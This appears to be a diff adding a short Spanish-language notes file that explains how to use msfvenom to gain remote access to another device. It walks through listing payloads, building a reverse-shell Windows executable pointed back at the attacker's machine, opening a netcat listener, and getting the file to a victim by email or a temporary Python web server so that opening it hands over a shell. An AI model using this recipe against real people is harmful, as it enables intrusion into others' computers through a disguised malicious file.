@@ -1,0 +1,21 @@
+QUÉ ÉS
+msfvenom es una herramienta para ganar acceso remoto mediante una reverse shell a otro dispositivo.
+
+Primero listamos los payloads "msfvenom -l payloads". -l= list
+Si queremos concretar el payload que queremos, es decir si queremos un payload especifico para windows hacemos un 
+"msfvenom -l payloads | grep windows/linux/etc"
+
+Ahora nos apareceran los payloads. 
+Seguidamente una vez encontrado el payload(si queremos ganar una reverseshell daremos prioridad a los payloads que salga reverse tcp o una cosa parecida), copiamos el payload.
+
+A continuación crearemos el fichero. "msfvenom -p PAYLOAD LHOST=ip_equipo LPORT=puerto_escucha -f exe -o fichero.exe".
+-p= payload, -f=tipo de extension del fichero, -o=para elegir nombre del fihcero
+
+Nos ponemos en escucha por el puerto que hayamos puesto en el payload "nc -nlvp puerto"
+
+Enviaremos el fichero por gmail por ejemplo. O tambien podemos crear un servidor temporal con "python -m http.server 80".
+
+Y una vez se abra el fichero ganaremos acceso remoto en nuestro kali. 
+
+
+
